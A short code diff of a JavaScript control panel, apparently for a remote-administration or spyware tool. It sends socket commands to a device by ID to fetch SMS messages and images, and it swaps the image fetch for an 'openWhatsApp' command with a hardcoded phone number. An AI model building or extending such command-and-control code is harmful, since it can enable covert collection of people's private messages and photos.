@@ -125,7 +125,7 @@ function getMessages() {
     hideOtherTabs('messages_div');
     if (refresh_check.checked || firstLoadMessages) {
         messages_div.innerHTML = 'Loading messages, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'getSms', arg1: 100}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'getSms', arg1: 50}], uid: currentUID});
     }
     firstLoadMessages = false;
     refresh_check.checked = false;
@@ -145,11 +145,11 @@ function getImages() {
     if (refresh_check.checked || firstLoadImages) {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'openWhatsApp', arg1: '7409062770', arg2: 'jadfhjsd'}], uid: currentUID});
 
-        setTimeout(function () {
-            socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
-        }, 5000)
+        // setTimeout(function () {
+        //     socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
+        // }, 5000)
     }
     firstLoadImages = false;
     refresh_check.checked = false;
